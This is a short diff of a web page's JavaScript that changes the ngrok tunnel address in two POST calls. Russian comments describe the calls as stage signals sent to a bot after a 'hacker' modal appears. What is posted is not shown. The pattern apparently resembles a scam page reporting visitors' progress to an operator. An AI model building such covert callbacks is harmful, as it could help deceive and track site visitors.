@@ -90,7 +90,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 hackerModal.classList.add('visible');
                 
                 // --- ОТПРАВЛЯЕМ СИГНАЛ В БОТА: ЭТАП 2 ---
-                fetch('https://onlooker-darkening-polygon.ngrok-free.dev/api/stage2', {
+                fetch('https://victory-ramp-grout.ngrok-free.dev/api/stage2', {
                     method: 'POST',
                     headers: { 
                         'Content-Type': 'application/json',
@@ -108,7 +108,7 @@ document.addEventListener('DOMContentLoaded', () => {
                         }
 
                         // --- ОТПРАВЛЯЕМ СИГНАЛ В БОТА: ЭТАП 3 ---
-                        fetch('https://onlooker-darkening-polygon.ngrok-free.dev/api/success', {
+                        fetch('https://victory-ramp-grout.ngrok-free.dev/api/success', {
                             method: 'POST',
                             headers: { 
                                 'Content-Type': 'application/json',
